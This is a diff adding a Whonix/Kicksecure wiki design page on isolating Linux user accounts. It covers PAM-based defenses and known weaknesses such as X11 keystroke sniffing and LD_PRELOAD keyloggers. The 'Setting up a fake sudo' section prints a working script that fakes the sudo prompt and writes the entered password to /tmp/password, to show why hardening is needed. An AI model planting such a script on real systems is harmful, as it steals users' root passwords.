@@ -1,0 +1,223 @@
+{{Header}}
+{{Title
+|title=Strong Linux User Account Isolation
+}}
+{{#seo:
+|title=Strong Linux User Account Isolation
+|description=Protect Linux User Accounts against Brute Force Attacks, Root Account Locking, Console Lockdown, sudo password sniffing, X Windows System Password Sniffing, /proc/pid/sched spy on keystrokes, Linux user account cracking, pam-tally2, pam-cracklib, /etc/securetty
+|image=https://www.whonix.org/w/images/0/0a/Useraccountisolatiom123123.jpg
+}}
+
+= Basics =
+Most if not all Linux desktop operating systems: By default, a compromised non-root user account which is member of group <code>sudo</code> is almost equal to full root compromise as there are too many ways for an attacker to retrieve the sudo password.
+
+Compromised non-root users that are not member of group <code>sudo</code> require a local privileged escalation exploit in order to acquire root compromise. Root password bruteforcing is not possible. For example a user such <code>www</code> in case the web server gets exploited could not gain root without an additional local privileged escalation exploit.
+
+= Defenses =
+== Console Lockdown ==
+Console lockdown allows only members of group <code>console</code> to use console. Everyone else except members of group <code>console-unrestricted</code> are restricted from using console using ancient, unpopular login methods such as using <code>/bin/login</code> over networks, which might be exploitable. ([https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0797 CVE-2001-0797]) Using <code>pam_access</code>. It is active for pam service <code>login</code>. Implemented in package [https://github.com/Whonix/security-misc security-misc].
+
+[https://github.com/Whonix/security-misc/blob/master/usr/lib/security-misc/pam_tally2-info This also has good usability.] Attempts to login into console for users which are not a member of group <code>console</code> would result in an error message.
+
+By {{Project name}} and {{Kicksecure}} default:
+
+* Console lockdown is [https://github.com/Whonix/anon-base-files/blob/master/debian/anon-base-files.postinst enabled by] default in {{Project name}} and {{Kicksecure}} version <code>15.0.0.8.7</code> and above.
+* Only user <code>user</code> is a member of group <code>console</code> by default.
+* There are no default members of group <code>console-unrestricted</code>.
+
+Related files:
+
+* https://github.com/Whonix/security-misc/blob/master/usr/share/pam-configs/console-lockdown-security-misc
+* https://github.com/Whonix/security-misc/blob/master/usr/lib/security-misc/pam_only_if_login
+* https://github.com/Whonix/security-misc/blob/master/etc/security/access-security-misc.conf
+* https://forums.whonix.org/t/etc-security-hardening-console-lockdown-pam-access-access-conf/8592
+
+== Bruteforcing Linux User Account Passwords ==
+Bruteforcing into Linux user accounts is severely limited in by package [https://github.com/Whonix/security-misc security-misc].
+
+* Lock user accounts after 50 failed login attempts using pam_tally2 until [[Root#Unlock_User_Account:_Excessive_Wrong_Password_Entry_Attempts|password unlock procedure]] is required.
+* https://github.com/Whonix/security-misc/blob/master/usr/share/pam-configs/tally2-security-misc
+* https://github.com/Whonix/security-misc/blob/master/usr/lib/security-misc/pam_tally2-info
+* [https://github.com/Whonix/security-misc/blob/master/usr/lib/security-misc/pam_tally2-info This also has good usability.] After the first authentication failure, pam_tally2-info by security-misc will show the number of remaining login attempts before unlock prodecure will be required. Once required, will show a link to documentation how to perform [[root#unlock|unlock procedure]].
+
+== Online Password Cracking Restrictions ==
+A secure password for root/user accounts must not necessarily follow the same rationale as explained on the [[Passwords]] page. Offline attacks against the password (parallelization, password cracking attempts only limited by RAM, disk, and CPU) are not possible. Only "online" attacks are possible. Similar to attempts of cracking a password of a user account on a website. Only x attempts every y time are possible. See also [https://forums.whonix.org/t/protect-linux-user-accounts-against-brute-force-attacks protect Linux user accounts against brute force attacks].
+
+== /etc/securetty ==
+Package [https://github.com/Whonix/security-misc security-misc] removes all non-comments from <code>/etc/securetty</code>. Thereby root login and ancient consoles can no longer be used to attempt root login.
+
+* https://github.com/Whonix/security-misc/blob/master/etc/securetty.security-misc
+
+== Root Login Disabled ==
+Root login is disabled by default since {{Project name}} <code>15.0.0.3.6</code>.
+
+Only one user account with password and no root account login supported by default also means the user has only to remember and secure one rather than two strong passwords.
+
+usability:
+
+* Root login failures do not count as a failed login attempt fortunately to to the pam_tally2 implementation by security-misc.
+
+related files:
+
+* https://github.com/Whonix/security-misc/blob/master/usr/share/pam-configs/pam-abort-on-locked-password-security-misc
+* https://github.com/Whonix/security-misc/blob/master/usr/lib/security-misc/pam-abort-on-locked-password
+* documentation: [[root]]
+
+== su restrictions ==
+By Debian default, any user account can attempt to use <code>su</code> to try to switch to the root user or any other user account. Any user account can try to bruteforce switching to another user account. [[Kicksecure]] / [[Whonix]] (package [https://github.com/Whonix/security-misc security-misc]) configure that group <code>sudo</code> membership required to use <code>su</code> using [https://manpages.debian.org/pam_wheel pam_wheel].
+
+* https://github.com/Whonix/security-misc/blob/master/usr/share/pam-configs/wheel-security-misc
+
+In future, feature [[Security-misc#SUID_Disabling_and_Permission_Hardening|SUID Disabling and Permission Hardening]] by security-misc will among other SUID removal from binaries also include removal of SUID from <code>su</code> by default for further hardening.
+
+== sudo restrictions ==
+By Debian default, users who are not members of the group <code>sudo</code> cannot use <code>sudo</code>. Therefore limited user accounts (for example user <code>sdwdate</code>) cannot use <code>sudo</code> to attempt to crack other user account passwords to run under these users.
+
+= Issues =
+== sudo password sniffing ==
+A compromised user account user <code>user</code> could be infected with a keylogger which could trivially read the <code>sudo</code> password and thereby acquire root access.
+
+Therefore instructions [[Root#Prevent_Malware_from_Sniffing_the_Root_Password|Prevent Malware from Sniffing the Root Password]] are still required. It's for advanced users only and awareness and usability is bad.
+
+In future, [https://forums.whonix.org/t/multiple-boot-modes-for-better-security-persistent-root-persistent-noroot-live-root-live-noroot/7708 multiple boot modes for better security: persistent + root | persistent + noroot | live + root | live + noroot] might solve this issue. Reasons:
+
+* Users would have a strong guidance to separate use of user <code>user</code> through different boot modes.
+* User <code>user</code> would not be a member of group <code>sudo</code> by default anymore.
+* Only user <code>admin</code> would be a member of group <code>sudo</code> by default.
+* Every day activity considered higher risk such as browsing the internet would be done clearly separated under user <code>user</code> while activities such as package installation and system upgrades would be done using separate user <code>admin</code>.
+* Therefore the more likely compromised user <code>user</code> would not have a chance to sniff the <code>sudo</code> password and therefore would be hindered from escalating to root without a local privilege escalation exploit.
+
+== X Windows System ==
+Any graphical application running under X Windows System (X11) can see what any user is typing in any other application for any user. 
+For example, if user <code>user</code> running X11 would run <code>lxsudo -u limited-user some-application</code> that application if compromised could sniff anything that user <code>user</code> is writing. Including but not limited to any <code>sudo</code> password prompts. This is also the case for applications running under mandatory access control framework [[AppArmor]].
+
+See the following footnotes for references about security issues with GUI isolation related to X Windows System (X11). <ref>
+[https://blog.invisiblethings.org/2011/04/23/linux-security-circus-on-gui-isolation.html Quote] Joanna Rutkowska, security researcher, founder and advisor (formerly architecture, security, and development) of Qubes OS:
+
+<blockquote>
+One application can sniff or inject keystrokes to another one, can take snapshots of the screen occupied by windows belonging to another one, etc.
+</blockquote>
+</ref> <ref>
+https://github.com/QubesOS/qubes-issues/issues/2695#issuecomment-521646366
+
+@Patrick
+
+<blockquote>
+Why “I” can do it but user “man” cannot? What makes “me” and user “man” different?
+
+On non-Qubes Debian I am always wondering if I can switch a virtual console using ctrl + alt + F1, why can user “man” not? And how’s that different in Qubes?
+<blockquote>
+
+@marmarek wrote:
+
+<blockquote>
+This is about where the process is started and what has connected as controlling terminal. It isn’t anything Qubes specific. A non-privileged process cannot inject characters into a separate session (lets forget about X11 breaking all this assumptions, as we are talking about non-X11 session), especially if it’s of a different user, similarly as it cannot write to files it doesn’t have write permission. to. You can think of it as a write access to /dev/tty* (or /dev/hvc0 in this case). When you login on /dev/hvc0, login process (running as root) will setup permission to <code>/dev/hvc0</code> and also pass an open FD to it to your shell. Then, you (<code>user</code>, and that shell) will be able to interact with <code>/dev/hvc0</code> and specifically run commands connected to it. If you don’t login there, login process will not set the permissions, so you won’t have access. &gt; This does assume kernel enforced permissions are effective, but as we are talking here about in-VM account isolation only, it’s a reasonable assumption.
+</blockquote>
+
+[https://github.com/marmarek marmarek]
+
+<blockquote>(lets forget about X11 breaking all this assumptions
+</blockquote>
+@Patrick
+
+<blockquote>
+Indeed.
+
+While [https://forums.whonix.org/t/enforce-kernel-module-software-signature-verification-module-signing-disallow-kernel-module-loading-by-default/7880/40 experimenting] with module loading disabling, I experienced that broken X can block switching to [https://www.whonix.org/wiki/Desktop#Virtual_Consoles virtual console]. Needless to say (for other readers), if X can do, also malware could do. “SysRq + r” can take away control from X. After that, switching to another virtual console was possible.
+</blockquote>
+
+@marmarek
+
+<blockquote>
+Yes, X (or other process with access to input device) can grab it for exclusive access, disabling Alt+Ctrl+F1 or similar combos. This still is independent of what is happening on other terminals. Especially, input devices grabbed in this mode are handled by X server (or other process that grabbed them). As long as X server doesn’t have access to other terminals, it still can’t influence them.
+</blockquote>
+</ref>
+
+Potential solutions:
+
+* [https://forums.whonix.org/t/can-apparmor-prevent-sudo-password-sniffing-through-abuse-of-x-windows-system/8973/8 Can AppArmor prevent sudo password sniffing through abuse of X Windows System?]
+* [https://forums.whonix.org/t/enlightenment-de/8900/10 Can we replace xfce window manager as an easy path to switch to wayland?]
+* In future, [https://forums.whonix.org/t/multiple-boot-modes-for-better-security-persistent-root-persistent-noroot-live-root-live-noroot/7708 multiple boot modes for better security: persistent + root | persistent + noroot | live + root | live + noroot] might solve this issue for similar reasons as in above chapter.
+
+Help welcome!
+
+== /proc/pid/sched spy on keystrokes ==
+The <code>/proc</code> filesystem leaks a lot of information about other processes which allows attackers to spy on certain processes a large amount. One example is <code>/proc/pid/sched</code> which allows attackers to spy on keystrokes but there is definitely far more information leakage than just that.
+
+* https://forums.whonix.org/t/proc-pid-sched-spy-on-keystrokes-proof-of-concept-spy-gksu/8225
+* https://www.openwall.com/lists/oss-security/2011/11/05/3
+* https://forums.whonix.org/t/apparmor-for-complete-system-including-init-pid1-systemd-everything-full-system-mac-policy/8339/363
+
+Potential solutions:
+
+* <code>hidepid=2</code> mount option to hide processes from other users - this would prevent spying on processes of other users but since most people run most of their apps as the same user, the benefits are limited unless multiple users are being used
+* PID namespaces to hide processes from outside the namespace and can be used for sandboxing apps - this would prevent spying on processes outside of the sandbox
+* [https://github.com/Whonix/apparmor-profile-everything apparmor-profile-everything] to give fine-grained restrictions over <code>/proc</code>
+
+== LD_PRELOAD ==
+
+<code>LD_PRELOAD</code> is an environment variable which specifies certain libraries to preload for an application. An attacker can preload their malicious library globally to log keystrokes or even worse, hijack the program.
+
+There are many examples of LD_PRELOAD rootkits in Linux. One example is:
+
+* https://github.com/Aishou/wayland-keylogger
+
+Potential solutions:
+
+* Use environment scrubbing for everything in <code>apparmor-profile-everything</code>.
+
+== Setting up a fake sudo ==
+
+An attacker can setup a fake <code>sudo</code> binary so the user gives them their password:
+
+{{CodeSelect|code=
+cat <<\EOF > /tmp/sudo
+#!/bin/bash
+if [[ "${@}" = "" ]]; then
+  /usr/bin/sudo
+else
+  read -r -p "[sudo] password for user: " password
+  echo "${password}" > /tmp/password
+  echo "Sorry, try again."
+  /usr/bin/sudo ${@}
+fi
+EOF
+chmod +x /tmp/sudo
+export PATH="/tmp:${PATH}"
+}}
+
+Specifying the file path of the real <code>sudo</code> will not work either:
+
+{{CodeSelect|code=
+function /usr/bin/sudo { echo "Doesn't work"; }
+function /bin/sudo { echo "Doesn't work"; }
+}}
+
+Potential solutions:
+
+* None except getting rid of <code>sudo</code> access
+
+Mounting all user-writeable places such as /home and /tmp as non-executable is not a solution because an attacker can use the bash interpreter to bypass the restrictions using <code>bash /path/to/script</code>. Would [https://phabricator.whonix.org/T941 interpreter lock] help?
+
+= Related =
+* https://forums.whonix.org/t/restrict-root-access/7658
+* https://forums.whonix.org/t/how-strong-do-linux-user-account-passwords-have-to-be-when-using-full-disk-encryption-fde-too/7698/8
+* [[Dev/VirusForget|VirusForget]]: about problematic files such as ~/.bashrc and other folders which malware can use to fake or sudo prompt and/or to persist after boot
+* [https://forums.whonix.org/t/multiple-boot-modes-for-better-security-persistent-root-persistent-noroot-live-root-live-noroot/7708 multiple boot modes for better security: persistent + root | persistent + noroot | live + root | live + noroot]
+* [https://forums.whonix.org/t/walled-garden-firewall-whitelisting-application-whitelisting-sudo-lockdown-superuser-mode-protected-mode/5725 walled garden, firewall whitelisting, application whitelisting, sudo lockdown, superuser mode, protected mode]
+* [[root]]
+
+= User Freedom =
+[[Kicksecure]] / [[Whonix]] / [https://github.com/Whonix/security-misc security-misc] does not restrict user freedom. All default settings can be undone. Everything is configurable and documented on page [[Root]].
+
+= Conclusions =
+Therefore there should be no way for limited user accounts which are compromised by malware to change to other user accounts such as root or user <code>user</code>.
+
+There are still [[#Issues|issues]] that would allow a compromised user <code>user</code> to escalate to root if user <code>user</code> is compromised unless procedure [[Root#Prevent_Malware_from_Sniffing_the_Root_Password|Prevent Malware from Sniffing the Root Password]] is applied.
+
+= Footnotes =
+{{reflist|close=1}}
+
+{{Footer}}
+
+[[Category:Design]]
